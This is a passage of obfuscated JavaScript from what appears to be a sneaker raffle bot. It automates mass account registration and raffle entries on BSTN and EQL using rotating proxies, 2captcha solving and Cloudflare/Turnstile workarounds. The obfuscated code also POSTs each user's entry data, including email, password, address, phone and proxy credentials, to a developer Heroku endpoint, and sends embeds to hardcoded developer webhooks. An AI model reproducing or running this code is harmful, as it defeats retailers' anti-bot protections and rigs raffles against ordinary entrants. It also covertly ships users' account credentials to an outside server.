                                    console['log'](_0x46dcc5() + '\x20[' + _0x1ef997['name'] + ']\x20Task\x20' + (_0x36ef76 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x4fda60(0x2710);
                                    const _0x4a7d2c = await _0x5b91f9['$']('#turnstile-wrapper');
                                    if (_0x4a7d2c)
                                        try {
                                            await _0x4a7d2c['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x5b91f9['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0xd7b8ad = await _0x5b91f9['$']('#turnstile-wrapper');
                                        if (_0xd7b8ad)
                                            try {
                                                await _0xd7b8ad['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x5b91f9['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                                } catch {
                                    throw new Error('Blocked\x20by\x20Cloudflare');
                                }
                                await _0x496747['send']('Browser.setWindowBounds', {
                                    'windowId': _0x3a19c7,
                                    'bounds': { 'windowState': 'minimized' }
                                }), await _0x4fda60(0x1388), await _0x5b91f9['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x5b91f9['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4fda60(0x1f4), console['log'](_0x46dcc5() + '\x20[' + _0x1ef997['name'] + ']\x20Task\x20' + (_0x36ef76 + 0x1) + '\x20:\x20Logging\x20in'), await _0x5b91f9['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x3c6714 => _0x3c6714['click']()), await _0x5b91f9['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x5b91f9['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4fda60(0x7d0), await _0x5b91f9['waitForSelector']('#email-login'), await _0x5b91f9['type']('#email-login', '' + _0x4774d3[_0x36ef76]['Email']['toLowerCase'](), { 'delay': 0xe6 }), await _0x4fda60(0xdac), await _0x5b91f9['waitForSelector']('#password'), await _0x5b91f9['type']('#password', '' + _0x4774d3[_0x36ef76]['Password'], { 'delay': 0xe6 }), await _0x4fda60(0x157c);
                                try {
                                    await _0x5b91f9['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x55a113 => _0x55a113['click']());
                                } catch {
                                }
                                try {
                                    await _0x5b91f9['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                                } catch (_0x319756) {
                                }
                                await _0x4fda60(0x3e8);
                                const _0x15153c = await _0x5b91f9['$']('.enteredDraw_container__2KmQ_');
                                if (_0x15153c) {
                                    console['log']('Duplicate\x20entry,\x20skipping');
                                    return;
                                }
                                console['log'](_0x46dcc5() + '\x20[' + _0x1ef997['name'] + ']\x20Task\x20' + (_0x36ef76 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x4774d3[_0x36ef76]['Size']);
                                try {
                                    if (_0x4774d3[_0x36ef76]['Size'] != 'RANDOM') {
                                        var _0x181c9a = _0x4774d3[_0x36ef76]['Size']['replace']('.', ',');
                                        const _0x377442 = await _0x5b91f9['$x']('//div[contains(text(),\x20\x27' + _0x181c9a + '\x27)]');
                                        await _0x377442[0x0]['click']();
                                    } else {
                                        const _0x375ee4 = await _0x5b91f9['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x479dc6 = Math['round'](Math['random']() * (_0x375ee4['length'] - 0x1));
                                        await _0x375ee4[_0x479dc6]['click']();
                                    }
                                } catch (_0x124dee) {
                                    throw new Error('Softblocked,\x20Rotating\x20proxy');
                                }
                                await _0x4fda60(0x1f4);
                                const _0x536483 = await _0x5b91f9['$']('.addressList_addressItem__LE2PB');
                                if (_0x536483 && _0x4774d3[_0x36ef76]['Mode'] != 'NEW') {
                                } else
                                    console['log'](_0x46dcc5() + '\x20[' + _0x1ef997['name'] + ']\x20Task\x20' + (_0x36ef76 + 0x1) + '\x20:\x20Filling\x20Address'), await _0x5b91f9['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x4fda60(0x5dc), await _0x5b91f9['waitForSelector']('#firstname'), await _0x5b91f9['type']('#firstname', '' + _0x4774d3[_0x36ef76]['FirstName']), await _0x4fda60(0x1f4), await _0x5b91f9['waitForSelector']('#firstname'), await _0x5b91f9['type']('#lastname', '' + _0x4774d3[_0x36ef76]['LastName']), await _0x4fda60(0x1f4), await _0x5b91f9['waitForSelector']('#firstname'), await _0x5b91f9['type']('#street', '' + _0x4774d3[_0x36ef76]['Address1']), await _0x4fda60(0x1f4), await _0x5b91f9['waitForSelector']('#firstname'), await _0x5b91f9['type']('#houseNumber', _0x4774d3[_0x36ef76]['HouseNumber'] + '\x20' + _0x4774d3[_0x36ef76]['Address2']), await _0x4fda60(0x1f4), await _0x5b91f9['waitForSelector']('#firstname'), await _0x5b91f9['select']('#country_code', '' + _0x4774d3[_0x36ef76]['Country']), await _0x4fda60(0x1f4), await _0x5b91f9['type']('#postcode', '' + _0x4774d3[_0x36ef76]['Zip']), await _0x4fda60(0x1f4), await _0x5b91f9['type']('#city', '' + _0x4774d3[_0x36ef76]['City']), await _0x4fda60(0x1f4), await _0x5b91f9['type']('#telephone', '' + _0x4774d3[_0x36ef76]['Phone']), await _0x4fda60(0x1f4), await _0x5b91f9['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                                await _0x4fda60(0x9c4);
                                try {
                                    await _0x5b91f9['type']('#instagram_name', '' + _0x4774d3[_0x36ef76]['Follower']), await _0x5b91f9['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x46dcc5() + '\x20[' + _0x1ef997['name'] + ']\x20Task\x20' + (_0x36ef76 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4fda60(0x5dc);
                                try {
                                    await _0x5b91f9['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x4fda60(0x5dc), await _0x5b91f9['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x5b4291 => _0x5b4291['click']()), await _0x4fda60(0x1388);
                                try {
                                    await _0x5b91f9['waitForSelector']('.success_msg__2HjJY');
                                } catch {
                                    await _0x5b91f9['reload']({ 'waitUntil': 'networkidle2' });
                                    if (_0x4774d3[_0x36ef76]['Size'] != 'RANDOM') {
                                        var _0x181c9a = _0x4774d3[_0x36ef76]['Size']['replace']('.', ',');
                                        const _0x5d20ea = await _0x5b91f9['$x']('//div[contains(text(),\x20' + _0x181c9a + ')]');
                                        await _0x5d20ea[0x0]['click']();
                                    } else {
                                        const _0x4cdade = await _0x5b91f9['$$']('div.swatchTile_tile__IRH9Q');
                                        var _0x479dc6 = Math['round'](Math['random']() * (_0x4cdade['length'] - 0x1));
                                        await _0x4cdade[_0x479dc6]['click']();
                                    }
                                    await _0x4fda60(0x5dc);
                                    try {
                                        await _0x5b91f9['hover']('#instagram_name'), await _0x5b91f9['type']('#instagram_name', '' + _0x4774d3[_0x36ef76]['Follower']), await _0x5b91f9['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                    } catch {
                                    }
                                    console['log'](_0x46dcc5() + '\x20[' + _0x1ef997['name'] + ']\x20Task\x20' + (_0x36ef76 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2340c5 + '\x20/\x205)');
                                    try {
                                        await _0x5b91f9['hover']('.checkBox_boxHolder__wLGVe'), await _0x4fda60(0x5dc), await _0x5b91f9['click']('.checkBox_boxHolder__wLGVe');
                                    } catch {
                                    }
                                    await _0x4fda60(0x157c), await _0x5b91f9['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x840f27 => _0x840f27['click']()), await _0x4fda60(0x1388), await _0x5b91f9['waitForSelector']('.success_msg__2HjJY');
                                }
                                _0x349800 = 'no', _0x8bf342(_0x4774d3[_0x36ef76], _0x1ef997);
                                try {
                                    prxdata = {
                                        'username': _0x26c985['replace']('#', ''),
                                        'entrydata': JSON['stringify'](_0x139878),
                                        'proxy': '' + _0x2077fa[_0x36ef76]
                                    };
                                    var _0x2006c2 = JSON['stringify'](prxdata);
                                    let _0x274438 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3c935b['post']('https://jraffles.herokuapp.com/success', _0x2006c2, _0x274438);
                                } catch (_0x3184a2) {
                                }
                                console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x1ef997['name'] + ']\x20Task\x20' + (_0x36ef76 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x2de165 = await _0x1523c9(_0x4774d3[_0x36ef76], _0x1ef997, 'dev', ![]), _0x2a7dcf = await _0x1523c9(_0x4774d3[_0x36ef76], _0x1ef997, 'pub', ![]);
                                const _0x2d1e0d = {
                                    'succesDEVMSG': { 'embeds': [_0x2de165] },
                                    'succesPUBMSG': { 'embeds': [_0x2a7dcf] }
                                };
                                let _0x139878 = _0x4774d3[_0x36ef76];
                                try {
                                    prxdata = {
                                        'username': _0x26c985['replace']('#', ''),
                                        'module': _0x1ef997['name'],
                                        'entrydata': JSON['stringify'](_0x139878),
                                        'proxy': '' + _0x2077fa[_0x36ef76]
                                    };
                                    var _0x2006c2 = JSON['stringify'](prxdata);
                                    let _0x1f35e0 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3c935b['post']('https://jraffles.herokuapp.com/success', _0x2006c2, _0x1f35e0);
                                } catch (_0x374ff1) {
                                }
                                try {
                                    _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x2d1e0d['succesDEVMSG']), await _0x4fda60(0xc8), await _0xb6cfae(_0x4fb406, _0x2d1e0d['succesDEVMSG']), await _0x4fda60(0xc8), await _0xb6cfae(_0x5d80c9, _0x2d1e0d['succesPUBMSG']);
                                } catch (_0x280c3e) {
                                    console['log'](_0x3e3bb6['yellow'](_0x46dcc5() + '\x20[' + _0x1ef997['name'] + ']\x20Task\x20' + (_0x36ef76 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x280c3e));
                                }
                            } catch (_0x5b3fd5) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x1ef997['name'] + ']\x20Task\x20' + (_0x36ef76 + 0x1) + '\x20:\x20' + _0x5b3fd5)), _0x349800 = 'yes', _0x33f32f = '' + _0x5b3fd5;
                                var _0x5410be = await _0x1523c9(_0x4774d3[_0x36ef76], _0x1ef997, 'dev', !![], _0x33f32f), _0x2de165 = await _0x1523c9(_0x4774d3[_0x36ef76], _0x1ef997, 'dev', ![]), _0x2a7dcf = await _0x1523c9(_0x4774d3[_0x36ef76], _0x1ef997, 'pub', ![]);
                                const _0x2c4f48 = {
                                    'succesDEVMSG': { 'embeds': [_0x2de165] },
                                    'succesPUBMSG': { 'embeds': [_0x2a7dcf] }
                                };
                                _0x2c4f48['errorDEV'] = { 'embeds': [_0x5410be] }, _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x2c4f48['errorDEV']), await _0xb6cfae(_0x991bd5, _0x2c4f48['errorDEV']);
                            } finally {
                                _0x23c63f && _0x23c63f['close']();
                                if (_0x349800 == 'yes' && _0x2340c5 != 0x5)
                                    return console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x1ef997['name'] + ']\x20Task\x20' + (_0x36ef76 + 0x1) + '\x20:\x20Retrying\x20(' + _0x2340c5 + '\x20/\x205)')), _0x2340c5 = _0x2340c5 + 0x1, _0x361091--, _0x483c53(_0x1ef997, _0x4774d3, _0x2077fa, _0x36ef76, _0x2340c5);
                                _0x349800 == 'yes' && _0x2340c5 >= 0x5 && _0x2540d5(_0x4774d3[_0x36ef76], _0x1ef997), !_0x3f3eb1 && (console['log'](_0x46dcc5() + '\x20[' + _0x1ef997['name'] + ']\x20Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay'])), _0x361091--;
                            }
                        }
                        _0x483c53(_0x564ab1, _0x2add80, _0x55707e, _0x46925d, 0x0), await _0x4fda60(0x7d0);
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x556bb8, _0x305681) {
                    var _0x1e3a8d = 0x0, _0x5e48fc;
                    try {
                        const _0x2cca0e = _0x147d24['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x5e48fc = _0x22245b['parse'](_0x2cca0e, { 'header': !![] })['data'];
                    } catch (_0x36c149) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0x105446 = 0x0; _0x105446 < _0x5e48fc['length']; _0x105446++) {
                        maxTasks = Number(_0x255a87['threads']);
                        while (_0x1e3a8d >= maxTasks) {
                            await _0x4fda60(_0x255a87['delay']);
                        }
                        async function _0x2dd6c6(_0x262474, _0x4636da, _0x49d12c, _0xbe5d41, _0x19a4e6) {
                            _0x1e3a8d++, _0x510708['use'](_0x4fd89e()), _0x510708['use'](_0x3b4fcd({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x255a87['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x1e1647 != 'yes')
                                var _0x1e1647 = '', _0x19a4e6 = 0x0;
                            var _0x50e02d;
                            _0xf5e41e(_0x262474['name'] + '\x20Task\x20' + (_0xbe5d41 + 0x1) + '\x20/\x20' + _0x49d12c['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869);
                            var _0x4dd57b = await _0x1523c9(_0x49d12c[_0xbe5d41], _0x262474, 'acc', ![]);
                            const _0x29f84d = { 'succesDEVMSG': { 'embeds': [_0x4dd57b] } }, _0x490016 = 'https://www.bstn.com/eu_en/customer/account/create/';
                            var _0x17db00 = Math['round'](Math['random']() * (_0x4636da['length'] - 0x1)), _0x412e7e = _0x4636da[_0x17db00]['split'](':'), _0x3fac66;
                            try {
                                _0x3fac66 = await _0x510708['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x412e7e[0x0] + ':' + _0x412e7e[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            } catch {
                                _0x3fac66 = await _0x510708['launch']({
                                    'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                    'headless': !![],
                                    'args': [
                                        '--proxy-server=' + _0x412e7e[0x0] + ':' + _0x412e7e[0x1],
                                        '--no-sandbox',
                                        '--disable-setuid-sandbox'
                                    ]
                                });
                            }
                            try {
                                console['log'](_0x46dcc5() + '\x20[' + _0x262474['name'] + ']\x20Task\x20' + (_0xbe5d41 + 0x1) + '\x20:\x20Checking\x20' + _0x49d12c[_0xbe5d41]['Email']);
                                const _0x3ef8fb = await _0x3fac66['newPage']();
                                await _0x3ef8fb['authenticate']({
                                    'username': '' + _0x412e7e[0x2],
                                    'password': '' + _0x412e7e[0x3]
                                }), console['log'](_0x46dcc5() + '\x20[' + _0x262474['name'] + ']\x20Task\x20' + (_0xbe5d41 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3ef8fb['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3ef8fb['setRequestInterception'](!![]), _0x3ef8fb['on']('request', _0x1aa7cd => {
                                    _0x1aa7cd['resourceType']() === 'image' ? _0x1aa7cd['abort']() : _0x1aa7cd['continue']();
                                });
                                try {
                                    await _0x3ef8fb['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x3ef8fb['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                                } catch {
                                    _0x1e1647 = 'yes';
                                    throw new Error('Connection\x20Error');
                                }
                                await _0x3ef8fb['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x46dcc5() + '\x20[' + _0x262474['name'] + ']\x20Task\x20' + (_0xbe5d41 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x4fda60(0x3e8), await _0x3ef8fb['type']('#email', _0x49d12c[_0xbe5d41]['Email']), await _0x4fda60(0x1f4), await _0x3ef8fb['type']('#pass', _0x49d12c[_0xbe5d41]['Password']), await _0x4fda60(0x1f4), await _0x3ef8fb['$eval']('#login-form', _0x387c51 => _0x387c51['submit']());
                                try {
                                    await _0x3ef8fb['waitForSelector']('.product-items');
                                } catch {
                                    console['log'](_0x46dcc5() + '\x20[' + _0x262474['name'] + ']\x20Task\x20' + (_0xbe5d41 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                    return;
                                }
                                await _0x4fda60(0x190);
                                const _0x3e6bd5 = await _0x3ef8fb['evaluate'](() => {
                                    const _0x3c5099 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                    return _0x3c5099['map'](_0x1355a9 => _0x1355a9['alt']);
                                }), _0x11d9f6 = await _0x3ef8fb['evaluate'](() => {
                                    const _0x5094cd = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                    return _0x5094cd['map'](_0x35085a => _0x35085a['innerHTML']);
                                }), _0x2957d2 = await _0x3ef8fb['$$']('.raffle-winner');
                                if (_0x2957d2['length'] < 0x1) {
                                    console['log'](_0x46dcc5() + '\x20[' + _0x262474['name'] + ']\x20Task\x20' + (_0xbe5d41 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x1e1647 = 'no';
                                    return;
                                }
                                console['log'](_0x46dcc5() + '\x20[' + _0x262474['name'] + ']\x20Task\x20' + (_0xbe5d41 + 0x1) + '\x20:\x20' + _0x2957d2['length'] + '\x20Wins\x20Found!');
                                for (var _0x20429a = 0x0; _0x20429a < _0x2957d2['length']; _0x20429a++) {
                                    console['log'](_0x3e3bb6['green'](_0x3e6bd5[_0x20429a] + _0x11d9f6[_0x20429a]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                                }
                            } catch (_0x33afc3) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x262474['name'] + ']\x20Task\x20' + (_0xbe5d41 + 0x1) + '\x20:\x20' + _0x33afc3)), _0x50e02d = '' + _0x33afc3;
                                var _0x55500d = await _0x1523c9(_0x49d12c[_0xbe5d41], _0x262474, 'acc', !![], _0x50e02d);
                                _0x29f84d['errorDEV'] = { 'embeds': [_0x55500d] }, _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x29f84d['errorDEV']), await _0xb6cfae(_0x991bd5, _0x29f84d['errorDEV']), _0x1e1647 = 'yes';
                            } finally {
                                if (_0x3fac66)
                                    _0x3fac66['close']();
                                if (_0x1e1647 == 'yes' && _0x19a4e6 != 0x5)
                                    return console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x262474['name'] + ']\x20Task\x20' + (_0xbe5d41 + 0x1) + '\x20:\x20Retrying\x20(' + _0x19a4e6 + '\x20/\x205)')), _0x1e3a8d--, _0x19a4e6 = _0x19a4e6 + 0x1, _0x2dd6c6(_0x262474, _0x4636da, _0x49d12c, _0xbe5d41, _0x19a4e6);
                                _0x1e1647 == 'yes' && _0x19a4e6 >= 0x5 && (_0x2540d5(_0x49d12c[_0xbe5d41], _0x262474), _0x1e1647 = 'no', _0x19a4e6 = 0x0), console['log'](_0x46dcc5() + '\x20[' + _0x262474['name'] + ']\x20Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']), _0x1e3a8d--;
                            }
                        }
                        _0x2dd6c6(_0x556bb8, _0x305681, _0x5e48fc, _0x105446, 0x0), await _0x4fda60(0x15e);
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x4e8ad7, _0x3eff45, _0x126306) {
                _0x510708['use'](_0x4fd89e()), _0x510708['use'](_0x3b4fcd({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x255a87['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x96cbbb = 0x0; _0x96cbbb < _0x3eff45['length']; _0x96cbbb++) {
                    var _0x37adf1;
                    _0xf5e41e(_0x4e8ad7['name'] + '\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20/\x20' + _0x3eff45['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869);
                    try {
                        await _0x436f00(_0x3eff45, _0x96cbbb);
                    } catch {
                        _0x5e1a0c = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x234ac5(_0x4d5d26) {
                        const _0x21813b = _0x147d24['readFileSync']('../successful-tasks.csv', 'utf8'), _0x4fc7bc = _0x22245b['parse'](_0x21813b, { 'header': !![] })['data'];
                        let _0x26957d = ![];
                        for (var _0x3f9139 of _0x4fc7bc) {
                            if (_0x3f9139['Url'] == _0x4d5d26['Url'] && _0x3f9139['Email'] == _0x4d5d26['Email']) {
                                _0x26957d = !![];
                                break;
                            }
                        }
                        return _0x26957d;
                    }
                    if (await _0x234ac5(_0x3eff45[_0x96cbbb]) == !![]) {
                        console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x37f438 = ![];
                    const _0x270af9 = _0x147d24['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x34f603 = _0x22245b['parse'](_0x270af9, { 'header': !![] })['data'];
                    for (var _0x38393c of _0x34f603) {
                        _0x38393c['Email'] == _0x3eff45[_0x96cbbb]['Email'] && (_0x37f438 = !![]);
                    }
                    if (_0x37f438 == ![]) {
                        var _0x454a5c;
                        if (_0x3eff45[_0x96cbbb]['Url']['endsWith']('/')) {
                            _0x454a5c = _0x3eff45[_0x96cbbb]['Url'] + 'register';
                            if (_0x5e1a0c != 'yes')
                                var _0x5e1a0c = '', _0x5070b5 = 0x0;
                        } else {
                            _0x454a5c = _0x3eff45[_0x96cbbb]['Url'] + '/register';
                            if (_0x5e1a0c != 'yes')
                                var _0x5e1a0c = '', _0x5070b5 = 0x0;
                        }
                        if (_0x3eff45[_0x96cbbb]['Email'] == '' || _0x3eff45[_0x96cbbb]['FirstName'] == '' || _0x3eff45[_0x96cbbb]['LastName'] == '') {
                            console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x3eff45[_0x96cbbb]['Password'] == '' && (_0x3eff45[_0x96cbbb]['Password'] = 'JRaffles23!');
                        if (_0x255a87['useRandomProxy'] = ![])
                            var _0x17a32f = _0x126306[_0x96cbbb]['split'](':');
                        else
                            var _0x320f1a = Math['round'](Math['random']() * (_0x126306['length'] - 0x1)), _0x17a32f = _0x126306[_0x320f1a]['split'](':');
                        var _0x350c94;
                        try {
                            _0x350c94 = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x17a32f[0x0] + ':' + _0x17a32f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x350c94 = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x17a32f[0x0] + ':' + _0x17a32f[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x501ba5 = await _0x350c94['newPage']();
                            await _0x501ba5['authenticate']({
                                'username': '' + _0x17a32f[0x2],
                                'password': '' + _0x17a32f[0x3]
                            }), console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x501ba5['setRequestInterception'](!![]), _0x501ba5['on']('request', _0xf4c65 => {
                                _0xf4c65['resourceType']() === 'image' || _0xf4c65['resourceType']() === 'font' || _0xf4c65['resourceType']() === 'media' ? _0xf4c65['abort']() : _0xf4c65['continue']();
                            });
                            try {
                                await _0x501ba5['goto']('' + _0x454a5c);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x46dcc5() + '\x20[' + _0x4e8ad7['name'] + ']\x20Task\x20' + (_0x96cbbb + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x4fda60(0x3e8), await _0x501ba5['waitForSelector']('#email');
                            try {
                                try {
                                    await _0x501ba5['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x4fda60(0x3e8), _0x3eff45[_0x96cbbb]['Url']['includes']('en-GB') ? await _0x501ba5['click']('li[data-value=\x22UK\x20' + _0x3eff45[_0x96cbbb]['Size'] + '\x20/\x20US\x20' + (Number(_0x3eff45[_0x96cbbb]['Size']) + 0x1) + '\x22]') : await _0x501ba5['click']('li[data-value=\x22EU\x20' + _0x3eff45[_0x96cbbb]['Size'] + '\x22]');
                                } catch {
                                    await _0x501ba5['click']('#productQuantity'), await _0x4fda60(0x3e8), await _0x501ba5['click']('li[data-value=\x22' + (Number(_0x3eff45[_0x96cbbb]['Size']) - 0x1) + '\x22]');
                                }
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0x3eff45[_0x96cbbb]['Size']);
                            }
                            await _0x4fda60(0x6a4);
                            try {
                                await _0x501ba5['select']('.PhoneInputCountrySelect', _0x3eff45[_0x96cbbb]['Country']);
                            } catch {
                            }
                            await _0x501ba5['type']('#email', '' + _0x3eff45[_0x96cbbb]['Email']), await _0x4fda60(0x352), await _0x501ba5['waitForSelector']('#password'), await _0x501ba5['type']('#password', '' + _0x3eff45[_0x96cbbb]['Password']), await _0x4fda60(0x352), await _0x501ba5['type']('#phone', '' + _0x3eff45[_0x96cbbb]['Phone']), await _0x4fda60(0x352);
                            const _0x229eb6 = await _0x501ba5['$']('#title\x20>\x20label');
                            await _0x4fda60(0x12c);
                            _0x229eb6 && await _0x229eb6['click']();
                            await _0x501ba5['type']('#firstName', '' + _0x3eff45[_0x96cbbb]['FirstName']), await _0x4fda60(0x352), await _0x501ba5['type']('#lastName', '' + _0x3eff45[_0x96cbbb]['LastName']), await _0x4fda60(0x352);
                            _0x3eff45[_0x96cbbb]['Url']['includes']('footlocker.de') ? await _0x501ba5['type']('#birthdate', _0x8891f8(0xa, 0x1c) + '.' + _0x8891f8(0xa, 0xc) + '.' + _0x8891f8(0x7c6, 0x7d3)) : await _0x501ba5['type']('#birthdate', _0x8891f8(0xa, 0x1c) + '-' + _0x8891f8(0xa, 0xc) + '-' + _0x8891f8(0x7c6, 0x7d3));
                            await _0x4fda60(0x352), await _0x501ba5['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                !_0x3eff45[_0x96cbbb]['Url']['includes']('en-GB') && await _0x501ba5['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x4fda60(0x1f4), await _0x4fda60(0x5dc);
                            if (!_0x454a5c['includes']('footlocker'))
                                try {
                                    await _0x501ba5['click']('#country');
                                    const _0x2294db = await _0x501ba5['$']('li[data-value=\x22' + _0x3eff45[_0x96cbbb]['Country'] + '\x22]');
                                    await _0x2294db['click'](), await _0x2294db['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0x4fda60(0x3e8);
                            if (!_0x3eff45[_0x96cbbb]['Url']['includes']('en-GB')) {
                                await _0x501ba5['click']('#stateAutocomplete'), await _0x4fda60(0x5dc);
                                try {
                                    const _0x2f71aa = await _0x501ba5['$x']('//li[text()=\x22' + _0x3eff45[_0x96cbbb]['State'] + '\x22]');
                                    await _0x2f71aa[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
